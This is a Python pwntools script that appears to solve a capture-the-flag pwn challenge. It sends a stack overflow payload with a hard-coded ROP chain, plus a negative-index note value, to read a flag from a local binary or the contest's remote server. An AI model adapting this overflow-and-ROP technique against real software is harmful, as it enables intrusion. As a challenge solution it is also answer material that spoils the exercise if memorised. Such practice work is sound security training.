#!/usr/bin/env python3
from pwn import context, process, remote, p64
import argparse, json, os
context.log_level = 'error'
context.timeout = 4

WS = os.path.dirname(os.path.abspath(__file__))
POP_RDI = 0x401529
POP_RSI = 0x401dd5
STRLEN = 0x4011b0
MOV_EDX_EAX_THEN_WRITE = 0x401c33
REQUEST_BUILDER = 0x401d50
RELAY_HANDLER = 0x401f70
RET = 0x40101a
EXIT = 0x401180
NOTE0 = 0x40a180
NOTE1 = 0x40a1c0

# The parent writes the index bytes into a fixed global note slot so the ROP
# path needs no stack leak. NOTE 0's first dword is signed -4, which selects
# the first preopened flag.txt system entry from the child table.
chain_after_rip = [
    NOTE0, STRLEN,
    POP_RDI, 1,
    POP_RSI, NOTE0,
    MOV_EDX_EAX_THEN_WRITE,  # strlen(note0)==4; sets edx then writes 4 index bytes
    POP_RDI, 3,
    POP_RSI, NOTE0,
    REQUEST_BUILDER,         # op=3, payload=note0, length=4
    POP_RDI, NOTE1,
    RET,                     # align the RELAY function entry
    RELAY_HANDLER,           # queues op4, then decodes/prints pending op3 response
    POP_RDI, 0,
    EXIT,
]

payload = b'A' * 64 + b'B' * 8 + p64(POP_RDI) + b''.join(p64(x) for x in chain_after_rip)
assert len(payload) == 232, len(payload)

def run(target):
    synthetic = False
    flag_path = os.path.join(WS, 'flag.txt')
    if target == 'local' and not os.path.exists(flag_path):
        with open(flag_path, 'wb') as f:
            f.write(b'sun{safe_house_local_marker}\n')
        synthetic = True
    io = None
    result = {'target': target, 'payload_len': len(payload), 'chain_after_rip': [hex(x) for x in chain_after_rip]}
    try:
        io = process([os.path.join(WS, 'service')], cwd=WS) if target == 'local' else remote('chal.sunshinectf.games', 26007)
        result['banner'] = io.recvuntil(b'sh> ', timeout=5).hex()
        io.send(b'NOTE 0 ' + bytes.fromhex('fcffffff') + b'\n')
        result['note0'] = io.recvuntil(b'sh> ', timeout=5).hex()
        io.send(b'NOTE 1 4\n')
        result['note1'] = io.recvuntil(b'sh> ', timeout=5).hex()
        io.send(b'SUBMIT 232\n' + payload)
        result['post_trigger'] = io.recvall(timeout=6).hex()
        result['exit_code'] = io.poll() if target == 'local' else 'remote_socket_closed'
    except Exception as e:
        result['error'] = repr(e)
        if io is not None:
            try:
                result['partial'] = io.recvall(timeout=1).hex()
                result['exit_code'] = io.poll() if target == 'local' else 'remote_socket_closed' if target == 'local' else 'remote_socket_closed'
            except Exception:
                pass
    finally:
        if io is not None:
            io.close()
        if synthetic:
            os.unlink(flag_path)
    return result

parser = argparse.ArgumentParser()
parser.add_argument('target', choices=['local', 'remote'])
args = parser.parse_args()
print(json.dumps(run(args.target), indent=2))
